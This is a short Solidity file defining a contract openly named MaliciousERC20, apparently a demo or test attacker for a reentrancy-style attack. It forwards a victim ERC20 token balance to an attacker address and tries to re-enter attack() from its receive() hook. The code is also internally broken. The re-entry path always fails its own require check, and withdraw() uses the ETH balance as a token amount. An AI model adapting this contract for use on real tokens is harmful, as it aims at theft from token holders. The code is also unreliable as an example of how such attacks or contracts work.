// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MaliciousERC20 is ERC20 {
    ERC20 private _victim;
    address private _attacker;
    bool private _alreadyAttacking;

    constructor(address victim, address attacker) ERC20("Malicious Token", "MAL") {
        _victim = ERC20(victim);
        _attacker = attacker;
        _alreadyAttacking = false;
    }

    function attack() public {
        require(!_alreadyAttacking, "Attack in progress");
        _alreadyAttacking = true;
        uint256 balance = _victim.balanceOf(address(this));
        _victim.transfer(_attacker, balance);
    }

    receive() external payable {
        if (_alreadyAttacking) {
            attack();
        }
    }

    function withdraw() external {
        require(_alreadyAttacking, "No attack in progress");
        _victim.transfer(_attacker, address(this).balance);
        _alreadyAttacking = false;
    }
}
